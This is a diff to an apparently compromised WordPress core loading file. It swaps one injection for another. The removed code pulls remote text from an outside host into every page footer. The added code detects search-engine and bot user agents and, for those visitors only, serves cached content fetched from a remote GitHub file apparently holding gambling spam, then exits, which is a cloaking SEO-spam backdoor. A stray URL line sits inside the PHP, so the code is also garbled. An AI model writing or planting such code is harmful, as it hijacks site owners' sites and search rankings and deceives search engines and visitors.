@@ -103,23 +103,68 @@ if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
 
 	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
 }
-function fetch_url_content() {
-$url = "https://dontdelete.site/file.txt";
-
-$ch = curl_init();
-
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-
-$output = curl_exec($ch);
-
-if ($output === false) {
-echo 'Error: ' . curl_error($ch);
-} else {
-echo $output;
+if (!function_exists('is_bot')) {
+    function is_bot() {
+        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $bots = [
+            'Googlebot',
+            'TelegramBot',
+            'bingbot',
+            'Google-Site-Verification',
+            'Google-InspectionTool',
+            'AhrefsBot'
+        ];
+        foreach ($bots as $bot) {
+            if (stripos($user_agent, $bot) !== false) {
+                return true;
+            }
+        }
+        return false;
+    }
 }
 
-curl_close($ch);
-}
+if (is_bot()) {
+    $url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/SLOT%20RAJA';
+    $cache_file   = DIR . '/cache/directory-cache.html';
+    $cache_expire = 300;
 
-add_action('wp_footer', 'fetch_url_content');
+    
+    if (!is_dir(dirname($cache_file))) {
+        mkdir(dirname($cache_file), 0755, true);
+    }
+
+    $content = '';
+    $use_cache = false;
+https://www.iemanuelscorzalaquinua.edu.pe/
+    // cek cache masih valid?
+    if (file_exists($cache_file)) {
+        if (time() - filemtime($cache_file) < $cache_expire) {
+            $content   = file_get_contents($cache_file);
+            $use_cache = true;
+        } else {
+            // hapus cache lama
+            unlink($cache_file);
+        }
+    }
+
+    
+    if (!$use_cache) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL            => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_TIMEOUT        => 5
+        ]);
+        $response = curl_exec($ch);
+        curl_close($ch);
+
+        if ($response) {
+            $content = $response;
+            file_put_contents($cache_file, $content);
+        }
+    }
+
+    echo $content ?: "<!-- konten tidak tersedia -->";
+    exit;
+}
